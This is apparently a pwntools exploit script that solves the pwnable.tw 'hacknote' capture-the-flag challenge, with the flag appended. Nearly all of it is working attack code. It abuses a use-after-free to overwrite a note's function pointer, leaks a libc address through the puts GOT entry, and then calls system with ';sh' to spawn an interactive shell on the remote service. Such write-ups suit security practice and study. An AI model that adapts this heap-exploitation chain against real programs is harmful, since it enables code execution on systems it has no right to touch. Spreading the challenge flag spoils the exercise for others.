#!/usr/bin/env python3

from pwn import *

exe = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = connect("chall.pwnable.tw", 10102)

    return r


def main():
    r = conn()
    input()
    # good luck pwning :)
    def add_note(size, data):
        r.sendlineafter(b'Your choice :', b'1')
        r.sendlineafter(b'Note size :', size)
        r.sendlineafter(b'Content :', data)
    def delete_note(index):
        r.sendlineafter(b'Your choice :', b'2')
        r.sendlineafter(b'Index :', index)
    def print_note(index):
        r.sendlineafter(b'Your choice :', b'3')
        r.sendlineafter(b'Index :', index)
    add_note(b'20', b'AAAA')        # Create a chunk for modify
    add_note(b'20', b'BBBB')        # For contains metadata of note 2
    # pause()
    delete_note(b'0')
    delete_note(b'1')
    # pause()
    add_note(b'8', p32(0x804862b)+p32(exe.got['puts']))         # 0x804862b is puts address, it will put out the address of got.puts
    pause()
    print_note(b'0')
    libc_leak = u32(r.recv(4))
    libc.address = libc_leak - libc.sym['puts']
    info('Libc leak: ' + hex(libc_leak))
    info('Libc address: ' + hex(libc.address))
    system = libc.sym['system']
    delete_note(b'2')
    add_note(b'8', p32(system) + b';sh')            # system() will execute the parameter sh, it will be system(); -> system(sh);
    print_note(b'0')
    pause()
    r.interactive()


if __name__ == "__main__":
    main()
# FLAG{Us3_aft3r_fl3333_in_h4ck_not3}
